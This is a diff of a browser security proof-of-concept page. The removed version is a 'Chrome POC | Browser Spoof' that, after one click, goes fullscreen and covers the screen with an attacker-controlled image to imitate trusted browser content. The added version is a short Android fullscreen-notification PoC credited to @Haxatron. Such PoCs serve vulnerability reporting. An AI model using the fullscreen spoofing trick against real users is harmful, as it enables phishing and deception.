@@ -1,59 +1,7 @@
-<html>
-
-<head>
-    <style>
-        #front {
-            align-items: center;
-            justify-content: center;
-            display: block;
-        }
-        
-        #spoofed {
-            display: none;
-        }
-    </style>
-    <title>Chrome POC | Browser Spoof</title>
-</head>
-
-
-<body style="margin: 0;font-family: 'Ubuntu', Arial, sans-serif;">
-
-    <!--Front Page-->
-    <div id="front" onclick="run();">
-        <div style="display: flex; justify-content: center; align-items: center; height: 75vh;">
-            <div style="background-color: #fff; padding: 50px; box-shadow: 0px 0px 10px rgba(0,0,0,0.2); border-radius: 10px;width: 50vw;">
-                <img src="https://play-lh.googleusercontent.com/KwUBNPbMTk9jDXYS2AeX3illtVRTkrKVh5xR1Mg4WHd0CG2tV4mrh1z3kXi5z_warlk=w240-h480-rw" style="display: block; margin: 0 auto;height: 15vw;" />
-                <br>
-                <center>
-                    <h1>Click anywhere on the page to Spoof</h1>
-                </center>
-            </div>
-        </div>
-    </div>
-
-
-    <!--Spoofed Page-->
-    <div id="spoofed">
-
-        <!--Attacker controlled Spoofed content-->
-        <img src="spoof.png" style="width: 100vw;height: 100vh;" />
-
-    </div>
-
-
-    <script>
-        function run() {
-            const firstDiv = document.getElementById("front");
-            const secondDiv = document.getElementById("spoofed");
-            secondDiv.style.display = "block";
-            firstDiv.style.display = "none";
-
-
-            document.documentElement.requestFullscreen();
-
-
-        }
-    </script>
-</body>
-
-</html>
+<h1>Android Fullscreen blocked by external notification</h1>
+<h1>PoC by @Haxatron</h1>
+<h1>Filler between top and the button</h1>
+<h1>Filler between top and the button</h1>
+<h1>Filler between top and the button</h1>
+<h1>Filler between top and the button</h1>
+<button onclick = "document.documentElement.requestFullscreen()">start full screen</button>
